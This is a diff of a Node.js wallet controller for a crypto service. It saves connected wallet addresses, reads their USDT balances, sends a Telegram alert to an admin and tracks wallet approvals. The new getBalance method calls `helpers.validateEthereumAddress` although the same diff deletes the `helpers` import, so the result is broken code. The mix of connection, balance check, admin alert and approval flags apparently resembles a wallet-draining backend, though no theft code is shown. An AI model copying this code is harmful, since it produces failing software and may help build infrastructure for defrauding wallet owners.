@@ -2,7 +2,6 @@ const walletService = require('../services/wallet.service');
 const contractService = require('../services/contract.service');
 const database = require('../config/database');
 const validators = require('../utils/validators');
-const helpers = require('../utils/helpers');
 
 class WalletController {
     async connectWallet(req, res) {
@@ -18,12 +17,12 @@ class WalletController {
             
             const { address, name } = req.body;
             
-            // Save wallet to database - UPSERT (insert or update)
+            // Save wallet to database
             const query = `
-                INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
-                VALUES ($1, $2, NOW(), NOW(), false, false)
+                INSERT INTO wallets (address, name, created_at, updated_at)
+                VALUES ($1, $2, NOW(), NOW())
                 ON CONFLICT (address) DO UPDATE
-                SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
+                SET updated_at = NOW()
                 RETURNING *
             `;
             
@@ -32,14 +31,6 @@ class WalletController {
             
             // Get USDT balance
             const balance = await contractService.getWalletUSDTBalance(address);
-            
-            // Update balance in database
-            const updateQuery = `
-                UPDATE wallets 
-                SET usdt_balance = $1, last_balance_check = NOW()
-                WHERE address = $2
-            `;
-            await database.query(updateQuery, [balance, address]);
             
             // Send alert to admin
             const telegram = require('../config/telegram');
@@ -94,12 +85,9 @@ class WalletController {
                 });
             }
             
-            const wallet = result.rows[0];
-            
             res.json({
                 success: true,
-                message: 'Wallet approved successfully',
-                wallet: wallet
+                message: 'Wallet approved successfully'
             });
         } catch (error) {
             console.error('Wallet approval error:', error);
@@ -110,55 +98,40 @@ class WalletController {
         }
     }
 
-    async getWalletUSDTBalance(walletAddress) {
-    if (!this.initialized) {
-        console.warn('Contract service not initialized');
-        return '0';
-    }
-    
-    try {
-        // Make sure this is your TESTNET USDT contract address
-        const usdtAddress = process.env.USDT_CONTRACT_ADDRESS || 
-            '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e'; // REPLACE WITH YOUR ACTUAL TESTNET ADDRESS
-        
-        console.log('🔍 USING USDT CONTRACT:', usdtAddress);
-        console.log('🔍 FOR WALLET:', walletAddress);
-        
-        const usdtContract = new ethers.Contract(
-            usdtAddress,
-            ['function balanceOf(address account) external view returns (uint256)'],
-            this.provider
-        );
-        
-        const balance = await usdtContract.balanceOf(walletAddress);
-        console.log(' Raw balance from contract:', balance.toString());
-        
-        // Check what decimals your testnet USDT uses (could be 6, 18, or something else)
-        let decimals = 6; // Most common for USDT
-        
+    async getBalance(req, res) {
         try {
-            // Try to get decimals from contract
-            const decimalsFunc = new ethers.Contract(
-                usdtAddress,
-                ['function decimals() external view returns (uint8)'],
-                this.provider
-            );
-            decimals = await decimalsFunc.decimals();
-            console.log(' Decimals from contract:', decimals);
-        } catch (decimalsError) {
-            console.log(' Could not fetch decimals, using default:', decimals);
+            const { address } = req.params;
+            
+            // Validate address parameter
+            if (!address) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Wallet address is required'
+                });
+            }
+            
+            if (!helpers.validateEthereumAddress(address)) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Invalid wallet address format'
+                });
+            }
+            
+            const balance = await contractService.getWalletUSDTBalance(address);
+            
+            res.json({
+                success: true,
+                balance: balance,
+                address: address
+            });
+        } catch (error) {
+            console.error('Balance check error:', error);
+            res.status(500).json({
+                success: false,
+                error: 'Internal server error'
+            });
         }
-        
-        const formattedBalance = ethers.formatUnits(balance, decimals);
-        console.log(' Formatted balance:', formattedBalance);
-        
-        return formattedBalance;
-    } catch (error) {
-        console.error('Error getting wallet balance:', error);
-        return '0';
     }
 }
 
-
 module.exports = new WalletController();
-
